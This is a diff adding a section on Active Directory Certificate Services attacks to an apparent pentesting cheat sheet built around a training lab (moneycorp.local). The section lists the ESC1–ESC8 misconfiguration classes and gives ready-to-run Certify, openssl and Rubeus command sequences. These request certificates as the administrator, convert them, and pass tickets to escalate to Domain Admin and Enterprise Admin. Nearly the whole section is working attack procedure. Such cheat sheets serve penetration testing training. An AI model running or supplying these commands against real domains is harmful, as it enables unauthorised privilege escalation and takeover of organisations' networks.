@@ -1335,6 +1335,96 @@ ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp
 
 ```
 
+### Certificates - AD CS
+```powershell
+# There are multiple attacks:
+# - stealing: certificate with private keys export with various tecniques (API, PKinit, files, ...)
+# - persistence forging certificates, adding rogue CA, modifying existing CAs
+# - Escalation: multiple ways to abuse misconfigurations
+
+# Escalation techniques:
+# - ESC1: security settings permits to any user to request certifitaces
+# - ESC2: any purpose or no EKU 
+# - ESC3: request an enroll agent certificate and use it to request cert on behalf of ANY user
+# - ESC4: overly permissive ACLs on Templates
+# - ESC5: poor access control on CA server
+# - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA (permits to add a SAN to escalate)
+# - ESC7: Poor access control on roles on CA ("CA administrator" or "Certificate Manger)
+# - ESC8: NTLM relay to HTTP enrollmnet endpoints
+
+# Tools:
+# - Certify
+# - certipy
+
+# Enumerating  AD CS 
+Certify.exe cas
+
+# Enumerating  templates
+Certify.exe find
+
+# Finding vulnerable templates
+Certify.exe find /vulnerable
+
+### ESC1 abuse
+# In the case a template has the ENROLLEE_SUPPLIES_SUBJECT flag set and we can enroll it, we can abuse ESC1
+# Enumerating template for ESC1:
+.\Certify.exe find /enrolleeSuppliesSubject
+
+# request a certificate adding the Alternative name of Administrator
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+
+# Cut and paste the output into a esc1.pem file
+# Then use openssl tool to convert to pfx (supply a password to encrypt the private key)
+openssl pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
+
+# Then request a TGT as administrator supplying the ESC6.pfx as authentication (/password is the password used to convert from pem to pfx)
+Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
+
+### ESC6 abuse
+# In the case a template has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set and we can enroll it, we can abuse ESC6
+# request a certificate adding the Alternative name of Administrator
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator
+
+# Cut and paste the output into a esc6.pem file
+# Then use openssl tool to convert to pfx (supply a password to encrypt the private key)
+openssl pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc6.pfx
+
+# Then request a TGT as administrator supplying the ESC6.pfx as authentication
+Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt
+
+### ESC3 abuse
+# In the case we have a vulnerable template where the EKU contains "Certificate Request Agent", we can enroll it and it can be used for domain authentication
+# Export the finding
+Certify.exe find /json /outfile:C:\Tools\file.json
+
+# Verify if EKU contains property 1.3.6.1.5.5.7.3.2 (clientAuth) 
+((Get-Content C:\Tools\file.json |ConvertFrom-Json).CertificateTemplates | ?{$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *
+
+# In this case we have to request two certificates.
+# The  first one is the certificate for the Request agent
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent"
+
+# Save the output anc convert to a pfx named (for example) esc3agent.pfx
+# Next use this pfx to request a cetificate on behalf of administrator (domain admin, not enteprise admin)
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent" /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
+
+# Next save the output and convert to esc3age-DA.pfx
+Rubeus.exe asktgt /user:administrator /certificate:esc3agent-DA.pfx /password:SecretPass@123 /ptt
+
+# Now we're domain admin in dcorp domain
+# WE can escalte to EA changing the onbehalof paramenter
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent" /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
+
+# Save the output and convet to esc3agent-EA.pfx
+# Pass the certificate to forest root
+Rubeus.exe asktgt /user:administrator /certificate:esc3agent-EA.pfx /password:SecretPass@123 /dc:mcorp-dc.moneycorp.local /user:moneycorp.local\administrator /ptt
+
+```
+
+
+
+
+
 ### GenericAll Abused
 
 ![Main Logo](images/Example_BloodHound_GenericAll.PNG 'Example_Generic')
